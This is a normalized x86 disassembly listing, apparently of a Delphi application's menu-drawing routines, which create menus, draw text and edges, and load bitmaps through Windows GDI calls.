mov [ eax + 0x3f ] bl
mov eax [ rw-data ]
call sub_44f840
jmp r-xdata
cmp ebp [ esp ]
jge r-xdata
sub_450798
push ebx
mov ebx eax
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov eax [ ebx + 0x34 ]
pop ebx
retn
mov eax [ ebx + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
call CreateMenu
mov [ ebx + 0x34 ] eax
call CreatePopupMenu
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov eax ebx
call sub_450528
mov eax [ rw-data ]
call sub_44f840
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
sub_4507e4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ff50
push ebx
push sub_450598
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_450828
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_450a0c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4527c0
mov edi eax
test edi edi
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_404034
test bh 0x4
je r-xdata
mov eax edi
call sub_453dfc
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
test bl 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_42383c
cmp [ esi + 0x3a ] 0x0
je r-xdata
test bh 0x4
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404264
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x26
jne r-xdata
mov eax ebx
and eax 0x2
cmp eax 0x2
jne r-xdata
and ebx 0xffffffff
or ebx 0x2
jmp r-xdata
cmp [ esi + 0x39 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0xc ]
mov eax edi
call sub_423214
mov edx eax
or dl [ r-xdata ]
mov eax edi
call sub_423220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450a13
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
mov eax [ ebp + 0x10 ]
mov esi eax
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add [ ebp - 0x18 ] 0x4
push 0x2
push 0x6
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_423e68
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
or ebx 0x20000
and ebx 0xfffffffd
or ebx 0x0
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40425c
push eax
mov eax [ ebp - 0xc ]
call sub_40445c
push eax
mov eax [ ebp - 0x4 ]
call sub_423e68
push eax
call DrawTextA
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_422f54
push ebx
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40425c
push eax
mov eax [ ebp - 0xc ]
call sub_40445c
push eax
mov eax [ ebp - 0x4 ]
call sub_423e68
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
mov eax [ ebp + 0x10 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_422f54
mov eax 0xff00000d
call sub_422a94
mov esi eax
mov eax 0xff000010
call sub_422a94
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_422f54
jmp r-xdata
sub_450a78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_451360
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423720
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_422f54
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423720
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xfffffffc
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d83c
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423e68
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423718
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423720
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42818c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_450ebf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_429274
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_422f54
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44d83c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423720
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423718
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a2d0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4236f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423c48
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44db2c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423720
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450828
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_423220
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423e68
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_423a18
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_422f54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_40324c
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423e68
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450828
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451367
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_44f8ec
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_450828
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_451380
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_451c88
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423720
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_422f54
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4043a8
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423720
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_423ac4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
